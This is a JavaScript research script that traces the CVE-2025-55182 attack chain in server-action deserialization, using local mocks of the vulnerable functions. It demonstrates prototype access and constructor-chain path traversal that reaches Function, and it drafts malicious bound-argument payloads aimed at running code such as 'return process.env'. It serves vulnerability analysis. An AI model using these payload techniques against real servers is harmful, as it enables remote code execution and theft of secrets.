/**
 * CVE-2025-55182 - Understanding the Full Attack Chain
 *
 * The $F case does:
 * 1. getOutlinedModel(response, reference) -> object with .id and .bound
 * 2. loadServerReference$1(response, object.id, object.bound, ...)
 * 3. resolveServerReference(bundlerConfig, object.id)
 * 4. requireModule(serverReference) -> moduleExports[name]
 *
 * The vulnerable points are:
 * A. getOutlinedModel path traversal
 * B. requireModule prototype access (blocked by hasOwnProperty in fix)
 *
 * For pure path traversal attack, we need getOutlinedModel to return
 * an object where .id triggers resolveServerReference to return something
 * that makes requireModule access Function.
 *
 * Let's trace the exact flow...
 */

console.log("=== Tracing CVE-2025-55182 Attack Chain ===\n");

// The chunks in the response
const chunks = {
  0: { normalAction: async () => "result" }
};

// The bundlerConfig (server manifest)
const bundlerConfig = {
  "abc123": {
    id: "actions-chunk",
    chunks: [],
    name: "normalAction"
  }
};

// Webpack modules
const webpackModules = {
  "actions-chunk": {
    normalAction: async () => "result"
  }
};

function __webpack_require__(id) {
  return webpackModules[id];
}

// Simulate resolveServerReference
function resolveServerReference(bundlerConfig, id) {
  var name = "";
  var resolvedModuleData = bundlerConfig[id];  // VULNERABLE: prototype access!

  if (resolvedModuleData) {
    name = resolvedModuleData.name;
  } else {
    var idx = id.lastIndexOf("#");
    if (idx !== -1) {
      name = id.slice(idx + 1);  // ATTACKER CONTROLS THIS
      resolvedModuleData = bundlerConfig[id.slice(0, idx)];
    }
    if (!resolvedModuleData) {
      throw Error('Could not find module "' + id + '" in manifest');
    }
  }
  return [resolvedModuleData.id, resolvedModuleData.chunks, name];
}

// Simulate requireModule (VULNERABLE version)
function requireModule_vulnerable(metadata) {
  var moduleExports = __webpack_require__(metadata[0]);
  return moduleExports[metadata[2]];  // VULNERABLE: no hasOwnProperty check!
}

console.log("=== Attack Path 1: Using #constructor ===");
// If we send id = "abc123#constructor"
// resolveServerReference returns ["actions-chunk", [], "constructor"]
// requireModule accesses moduleExports["constructor"]

try {
  const ref = resolveServerReference(bundlerConfig, "abc123#constructor");
  console.log("Server reference:", ref);
  const result = requireModule_vulnerable(ref);
  console.log("Result:", result);
  console.log("Is Object:", result === Object);
} catch(e) {
  console.log("Error:", e.message);
}

console.log("\n=== The Problem ===");
console.log("moduleExports['constructor'] = Object, not Function");
console.log("We need TWO accesses: constructor.constructor = Function");

console.log("\n=== Attack Path 2: Path Traversal in getOutlinedModel ===");
// getOutlinedModel does: for (key = 1; key < reference.length; key++) parentObject = parentObject[reference[key]]
// This gives us MULTIPLE property accesses!

// If chunk 0 = { action: () => {} }
// reference = "0:constructor:constructor"
// Result = chunk[0]["constructor"]["constructor"] = Function!

function getOutlinedModel_vulnerable(chunks, reference) {
  reference = reference.split(":");
  var id = parseInt(reference[0], 16);
  var parentObject = chunks[id];

  for (var key = 1; key < reference.length; key++) {
    parentObject = parentObject[reference[key]];
  }
  return parentObject;
}

const pathTraversalResult = getOutlinedModel_vulnerable(chunks, "0:constructor:constructor");
console.log("Path traversal result:", pathTraversalResult);
console.log("Is Function:", pathTraversalResult === Function);

console.log("\n=== But How Do We Use This? ===");
// The $F handler expects getOutlinedModel to return { id: ..., bound: ... }
// If we return Function, it would do:
//   loadServerReference$1(response, Function.id, Function.bound, ...)
//   Function.id = undefined
//   Function.bound = undefined
// This would fail!

// UNLESS... we craft a reference that returns an object WITH id and bound
// that point to malicious values

console.log("\n=== Attack Path 3: Crafted Object with Malicious id ===");
// What if chunk 0 contains an object we control?
// In a real attack, the Flight protocol lets us send arbitrary data in chunks

const maliciousChunks = {
  0: {
    // A normal-looking object
    data: "some data",
    // But it has id and bound that will be used by loadServerReference$1!
    id: "abc123#constructor",  // Will access prototype!
    bound: Promise.resolve(["return 1+1"])  // Code to execute
  }
};

// With $F0, getOutlinedModel returns the whole chunk
const outlinedObj = getOutlinedModel_vulnerable(maliciousChunks, "0");
console.log("Outlined object:", outlinedObj);
console.log("obj.id:", outlinedObj.id);
console.log("obj.bound:", outlinedObj.bound);

// Now loadServerReference$1 is called with:
//   id = "abc123#constructor"
//   bound = Promise.resolve(["return 1+1"])

// This leads to:
//   resolveServerReference(bundlerConfig, "abc123#constructor")
//   -> ["actions-chunk", [], "constructor"]
//   requireModule_vulnerable(["actions-chunk", [], "constructor"])
//   -> moduleExports["constructor"] = Object

// Still only Object, not Function!

console.log("\n=== BREAKTHROUGH: Combine Both Attacks! ===");
// What if the chunk data ITSELF was obtained via path traversal?
// Or what if we can manipulate the bound args to include a function reference?

// Actually, the key might be in the bound args processing!
// bound is parsed by reviveModel and can contain $-prefixed references!

// If bound = ["$0:constructor:constructor", "return evil_code"]
// Then reviveModel turns "$0:constructor:constructor" into Function!
// The action is called with: action(Function, "return evil_code")
// If action does: arguments[0](arguments[1])() -> RCE!

console.log("\n=== Final Attack: Malicious Bound Args ===");
console.log('bound = ["$0:constructor:constructor", "return process.env"]');
console.log("After reviveModel: [Function, 'return process.env']");
console.log("action.bind(null, Function, 'return process.env')");
console.log("If action calls its first arg with second arg: Function('return process.env')() = RCE!");

console.log("\nThis still requires a specific action pattern that calls its arguments...");
console.log("The question is: Is there a way to get RCE WITHOUT a specific action pattern?");
